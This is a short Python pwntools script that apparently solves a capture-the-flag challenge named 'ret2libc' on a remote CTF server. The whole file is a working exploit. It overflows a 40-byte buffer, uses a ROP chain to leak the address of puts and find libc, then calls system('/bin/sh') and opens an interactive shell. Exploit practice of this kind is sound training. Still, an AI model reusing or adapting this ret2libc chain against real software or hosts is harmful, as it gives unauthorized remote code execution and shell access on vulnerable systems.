#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 4002

elf = ELF("./dist/ret2libc")
libc = ELF("./dist/libc-2.27.so")

rop = ROP(elf)

r = remote(RHOST, RPORT)
r.recvuntil(b"> ")

payload = flat(
    b"A"*40,
    p64(rop.rdi.address),
    p64(elf.got.puts),
    p64(elf.plt.puts),
    p64(elf.sym.main),
)

r.sendline(payload)
leak = u64(r.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts
binsh_str = next(libc.search(b"/bin/sh\x00"))
r.info(f"libc @ {libc.address:#x}")
r.info(f"system @ {libc.sym.system:#x}")
r.info(f"\"/bin/sh\" @ {binsh_str:#x}")

payload = flat(
    b"A"*40,
    p64(rop.rdi.address),
    p64(binsh_str),
    p64(rop.ret.address), # alignement
    p64(libc.sym.system),
    p64(rop.rdi.address),
    p64(0),
    p64(libc.sym.exit)
)

r.sendlineafter(b"> ", payload)
r.interactive()